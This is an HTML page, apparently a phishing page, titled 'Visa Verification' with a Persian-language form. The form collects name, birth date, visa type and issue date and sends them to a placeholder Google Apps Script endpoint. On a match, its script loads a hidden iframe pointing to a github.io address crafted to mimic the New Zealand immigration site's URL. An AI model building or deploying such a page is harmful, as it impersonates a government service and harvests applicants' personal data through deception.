<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Visa Verification</title>
  <style>
    body { font-family: sans-serif; direction: rtl; }
    input, button { margin: 8px 0; display: block; width: 100%; max-width: 300px; }
    #result { color: red; margin-top: 15px; }
  </style>
</head>
<body>
  <h2>فرم بررسی ویزا</h2>
  <form id="visaForm">
    <input type="text" id="name" placeholder="Name" required>
    <input type="text" id="lastName" placeholder="Last Name" required>
    <input type="date" id="dob" placeholder="Date of Birth" required>
    <input type="text" id="visaType" placeholder="Visa Type" required>
    <input type="date" id="visaDate" placeholder="Visa Issue Date" required>
    <button type="submit">بررسی</button>
  </form>
  <p id="result"></p>

  <iframe id="secretFrame" style="display: none;"></iframe>

  <script>
    const form = document.getElementById("visaForm");
    const result = document.getElementById("result");

    // آدرس Web App از Google Apps Script خود را اینجا قرار دهید
    const googleAppsScriptURL = "YOUR_WEB_APP_URL"; // جایگزین شود

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      result.textContent = "در حال بررسی...";

      const params = new URLSearchParams({
        name: document.getElementById("name").value.trim(),
        lastName: document.getElementById("lastName").value.trim(),
        dob: document.getElementById("dob").value,
        visaType: document.getElementById("visaType").value.trim(),
        visaDate: document.getElementById("visaDate").value
      });

      fetch(googleAppsScriptURL + "?" + params.toString())
        .then(res => res.text())
        .then(text => {
          if (text === "match") {
            result.textContent = "اطلاعات تطابق دارد. در حال انتقال...";
            document.getElementById("secretFrame").src = "https://newzealandvisaverification.github.io/https-visaview.immigration.govt.nz-vvs-registerVvsAccount.aspx/";
          } else {
            result.textContent = "اطلاعات واردشده نادرست است.";
          }
        })
        .catch(() => {
          result.textContent = "خطا در اتصال به سرور.";
        });
    });
  </script>
</body>
</html>
